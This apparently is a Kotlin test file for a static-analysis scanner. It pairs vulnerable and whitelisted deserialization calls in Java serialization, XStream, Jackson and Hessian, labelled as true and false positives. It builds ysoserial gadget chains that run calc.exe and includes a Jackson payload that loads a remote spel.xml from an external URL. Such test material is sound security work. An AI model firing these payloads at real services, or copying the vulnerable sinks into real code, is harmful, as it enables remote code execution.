import com.caucho.hessian.io.*
import com.fasterxml.jackson.databind.ObjectMapper
import com.fasterxml.jackson.module.kotlin.jacksonObjectMapper
import com.fasterxml.jackson.module.kotlin.readValue
import com.sun.xml.internal.ws.encoding.soap.DeserializationException
import com.thoughtworks.xstream.XStream
import com.thoughtworks.xstream.security.NoTypePermission
import com.thoughtworks.xstream.security.PrimitiveTypePermission
import kotlinx.serialization.ImplicitReflectionSerializer
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonConfiguration
import kotlinx.serialization.serializer
import kotlinx.serialization.serializerByTypeToken
import kotlinx.serialization.stringify
import java.io.*
import java.lang.reflect.Type
import kotlin.reflect.KClass
import kotlin.reflect.KType
import kotlin.reflect.full.createType
import kotlin.reflect.typeOf

// Some class for Jackson Deserialization
class lol {
    var id: Int = 0
    var obj: Any = 0
}

object JavaDeserializationTPsandFPs {
    fun javaDeserialization(args: Array<String>) {
        // ysoserial is a library for generating gadget chain payloads that cause code execution
        // this gadget chain relies on Apache Commons Collections v4.0, and executes calc.exe
        val cc = ysoserial.payloads.CommonsCollections2()
        var o = cc.getObject("calc.exe") as Serializable
        try {
            o = args[1000] // Simulate interactive input for CxSast
        } catch (e: ArrayIndexOutOfBoundsException) {
        }
        // Java serialization - vulnerable
        val baos = ByteArrayOutputStream()
        val oos = ObjectOutputStream(baos)
        oos.writeObject(o)

        val payload: ByteArray = baos.toByteArray()
        // Classic deserialization TP
        val bais = ByteArrayInputStream(payload)
        val ois = ObjectInputStream(bais)
        try {
            val oops = ois.readObject() // Vulnerable
        } catch (e: Exception) {
            e.printStackTrace()
        }

        // Safe deserialization, because resolveClass implementation whiteslists classes (in this case, to String.class)
        val bais2 = ByteArrayInputStream(payload)
        val ois2: ObjectInputStream = object : ObjectInputStream(bais2) {
            @Throws(IOException::class, ClassNotFoundException::class)
            override fun resolveClass(objectStreamClass: ObjectStreamClass): Class<*> {
                val clazz = super.resolveClass(objectStreamClass)
                return if (clazz != String::class.java) {
                    throw DeserializationException("Invalid class to deserialize: " + clazz.name)
                } else {
                    clazz
                }
            }
        }
        try {
            ois2.readObject() // Shouldn't be a result
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    // XStream
    @Throws(Exception::class)
    fun xstreamDeserialization(args: Array<String>) {
        // XStream serializes a gadget object to XML
        val xstream = XStream()
        val cc = ysoserial.payloads.CommonsCollections2()
        var o = cc.getObject("calc.exe") as Serializable
        try {
            o = args[1000] // Simulate interactive input for CxSast
        } catch (e: ArrayIndexOutOfBoundsException) {
        }
        val xml: String = xstream.toXML(o) // Serialization can be ignored here

        // Result - Naive deserialization with XStream
        var xs = XStream()
        xs.fromXML(xml)

        // Not a result - deserialization resolved by clearing types, and then enabling a whitelist of specific types
        xs = XStream()
        xs.addPermission(NoTypePermission.NONE)
        xs.addPermission(PrimitiveTypePermission.PRIMITIVES)
        xs.allowTypes(arrayOf<Class<*>>(String::class.java))
        xs.fromXML(xml)
    }

    @Throws(Exception::class)
    fun jacksonDeserialization(args: Array<String>) {
        val mapper = jacksonObjectMapper()
        var json : String
        try {
            json = args[100] // Create a fake source for SAST
        } catch (e : Exception) {
            json = "{\"id\":123," +
                        "\"obj\": " +
                            "[\"org.springframework.context.support.FileSystemXmlApplicationContext\", " +
                            "\"https://raw.githubusercontent.com/irsl/jackson-rce-via-spel/master/spel.xml\"]" +
                    "}"
            println(json)
        }

        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT); // NOT desanitizer
        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); // NOT desanitizer

        mapper.enableDefaultTyping(); // Desanitizer
        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE); // Desanitizer
        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS); // Desanitizer
        val state: Any = mapper.readValue<lol>(json)
        println(state)
    }

    fun hessianDeserialization(args: Array<String>) {
        val cc = ysoserial.payloads.Clojure()
        var o = cc.getObject("calc.exe") as Serializable
        try {
            o = args[1000] // Simulate interactive input for CxSast
        } catch (e: ArrayIndexOutOfBoundsException) {
        }
        val baos = ByteArrayOutputStream()
        val ho = HessianOutput(baos)
        ho.writeObject(o)
        val exploit = baos.toByteArray()
        println(String(exploit))
        val bos = ByteArrayInputStream(exploit)
        val hi = HessianInput(bos)
        hi.readObject()
    }

    fun hessian2Deserialization(args: Array<String>) {
        val cc = ysoserial.payloads.Clojure()
        var o = cc.getObject("calc.exe") as Serializable
        try {
            o = args[1000] // Simulate interactive input for CxSast
        } catch (e: ArrayIndexOutOfBoundsException) {
        }
        val baos = ByteArrayOutputStream()
        val ho2 = Hessian2Output(baos)
        ho2.writeObject(o)
        ho2.flush() // without flushing the object is not written; however there's no point in requiring this as a sink
        ho2.close()
        val exploit = baos.toByteArray()
        println(String(exploit))
        var bos: ByteArrayInputStream? = null
        var hi2: Hessian2Input? = null
        // TP
        try {
            bos = ByteArrayInputStream(exploit)
            hi2 = Hessian2Input(bos)
            hi2.readObject()
            hi2.close()
        } catch (e: Exception) {
            e.printStackTrace()
        }

        // TP
        try {
            bos = ByteArrayInputStream(exploit)
            hi2 = Hessian2Input(bos)
            hi2.readStreamingObject()
            hi2.close()
        } catch (e: Exception) {
            e.printStackTrace()
        }

        // FP
        // It's possible to sanitize Hessian2 by creating its input stream from a factory that is configured to use
        // a whitelist (classes are added via .allow())
        val factory = HessianFactory()
        factory.setWhitelist(true) // Sanitizer
        bos = ByteArrayInputStream(exploit)
        hi2 = factory.createHessian2Input(bos)
        hi2.readObject()
        hi2.close()
    }

    @ImplicitReflectionSerializer
    @Throws(Throwable::class)
    @JvmStatic
    fun main(args: Array<String>) {
        System.setProperty("upstreamXalan", "true")
        javaDeserialization(args) // Still vulnerable in Kotlin
        xstreamDeserialization(args) // Still vulnerable in Kotlin
        jacksonDeserialization(args) // Still vulnerbale in Kotlin, but uses a slightly different package for Kotlin
        hessianDeserialization(args) // Still vulnerable in Kotlin
        hessian2Deserialization(args) // Still vulnerable in Kotlin

        }
}
